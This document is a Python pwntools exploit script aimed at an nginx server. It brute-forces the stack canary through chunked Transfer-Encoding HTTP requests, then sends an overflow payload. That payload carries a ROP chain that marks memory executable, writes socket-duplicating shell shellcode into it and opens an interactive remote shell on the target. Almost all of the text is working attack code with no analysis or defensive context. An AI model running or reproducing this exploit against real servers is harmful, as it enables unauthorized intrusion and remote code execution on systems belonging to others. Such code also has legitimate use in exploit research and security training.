#! /usr/bin/env python3

from pwn import *
import os
import sys

elf = ELF("./nginx")
context.binary = elf
context.log_level = "ERROR"
context.terminal = ['tmux', 'splitw', '-h']
gdb_args = '''
set follow-fork-mode child
b *ngx_http_read_discarded_request_body+223
c
'''

shellcode = pwnlib.shellcraft.amd64.linux.dupsh(sock='rdi')
shellcode = asm(shellcode) + b'\x00'*3
sh = []
for i in range(0, len(shellcode), 8):
    sect = sh.append(shellcode[i:i+8])

mov_prdi_rsi = 0x0000000000408e0c
call_rax = 0x0000000000402c8e
pop_rsi = 0x00000000004083e2
weird_pop_rdx = 0x0000000000420ba4
add_rax_rdx = 0x000000000040a68d
m_rax_rcx = 0x0000000000406d46
maybe_pop_rdx = 0x000000000041bfe1
m_rax_rsi = 0x000000000042fada
pop_rdi = 0x0000000000403fbb
pop_rbx = 0x0000000000402d10
add_rax_rbx = 0x000000000041aeec
rwx_reg = 0x677000

rchain = p64(pop_rdi)
rchain += p64(rwx_reg)
rchain += p64(m_rax_rcx)
rchain += p64(pop_rbx)
rchain += p64(0xffffffffff2f13d0)
rchain += p64(m_rax_rcx)
rchain += p64(add_rax_rbx)
rchain += p64(0)
rchain += p64(weird_pop_rdx)
rchain += p64(0x7)
rchain += p64(weird_pop_rdx)
rchain += p64(0x7)
rchain += p64(pop_rsi)
rchain += p64(0x1000)
rchain += p64(call_rax)
rchain += p64(0)

for i in range(len(sh)):
    rchain += p64(pop_rdi)
    rchain += p64(rwx_reg)
    rchain += p64(pop_rsi)
    rchain += sh[i]
    rchain += p64(mov_prdi_rsi)
    rwx_reg += 8

rchain += p64(pop_rdi)
rchain += p64(3)
rchain += p64(0x677000)

# Brute Force Stack cookie
def brute_force(ip, port):
    print("Brute Forcing the stack cookie")
    payload = b"A"*(5063)
    payload += b"\x00"
    canary = b""
    for x in range(8):
        for i in range(256):
            p = remote(ip, int(port))
            data = payload
            data += i.to_bytes(1, byteorder='big')

            request = b'GET / HTTP/1.1\r\n' + \
                      b'Host: example.com\r\n' + \
                      b'Transfer-Encoding: chunked\r\n' + \
                      b'\r\n' + \
                      data
            p.send(request)
            try:
                p.recv()
                print(f"BYTE {i} FOUND")
                canary += i.to_bytes(1, byteorder='big')
                payload += i.to_bytes(1, byteorder='big')
                p.close()
                break
            except:
                p.close()
                pass
    if len(canary) == 8:
        print("Canary found: ", canary)
    else:
        print("Canary brute force failed")
        exit()
    return canary

# EXPLOIT
def exploit(canary, ip, port):
#    r = process(["/usr/local/nginx/sbin/nginx", "-g", "daemon off;"])
    payload = b"A"*5063 + b"\x00" + canary + b'B'*7 + b'C'*16 +rchain
    p = remote(ip, int(port))
    #pid = os.system("ps auxf | grep 'nginx: worker process' | grep nobody > pid")
    #with open("pid", "r") as f:
    #    pid = int(f.readlines()[1].split()[1])-1
#    gdb.attach(pid, gdbscript=gdb_args)
    #print(pid)
    data=payload
    request = b'GET / HTTP/1.1\r\n' + \
              b'Host: example.com\r\n' + \
              b'Transfer-Encoding: chunked\r\n' + \
              b'\r\n' + \
              data

    p.send(request)
    sleep(0.1)
    p.sendline(b'echo "YOU HAVE BEEN PWNED"')
    p.interactive()

ip = sys.argv[1]
port = sys.argv[2]
c = brute_force(ip, port)
input("Press enter to exploit")
exploit(c, ip, port)
